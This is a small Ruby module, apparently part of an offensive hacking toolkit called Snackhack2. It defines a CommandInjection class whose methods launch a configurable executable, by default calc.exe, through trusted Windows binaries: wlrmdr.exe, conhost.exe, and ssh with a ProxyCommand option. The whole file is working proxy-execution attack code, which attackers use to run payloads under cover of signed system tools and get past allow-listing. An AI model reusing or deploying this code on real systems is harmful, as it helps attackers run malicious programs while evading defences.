module Snackhack2
	class CommandInjection
		attr_accessor :exe, :title, :prompt
		def initialize
			@exe  = "calc.exe"
			@title = "Click me!"
			@prompt = "To run calculator" 
		end
		def wlrmdr_With_prompt
			Process.spawn("wlrmdr.exe -s 3600 -f 0 -t #{title} -m #{@prompt} -a 10 -u #{@exe}")
		end
		def wlrmdr_without_prompt
			Process.spawn("wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u #{@exe}")
		end
		def conhost
			Process.spawn("conhost.exe #{@exe}")
		end
		def ssh
			Process.spawn("ssh -o ProxyCommand=#{@exe} .")
		end
	end
end


